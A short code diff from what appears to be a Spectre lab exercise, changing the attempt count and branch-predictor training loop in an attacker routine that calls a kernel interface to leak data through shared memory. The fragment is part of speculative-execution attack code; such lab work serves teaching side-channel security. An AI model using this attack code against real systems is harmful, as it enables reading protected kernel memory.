@@ -62,12 +62,12 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             volatile char tmp = shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE];
         }
 
-        for (int attempt = 0; attempt < 1000; attempt++) {
+        for (int attempt = 0; attempt < 300; attempt++) {
 
             
 
             // 1. TRAIN branch predictor
-            for (int i = 0; i < 20; i++) {
+            for (int i = 0; i < 10; i++) {
                 call_kernel_part3(kernel_fd, shared_memory, 0);
             }
 
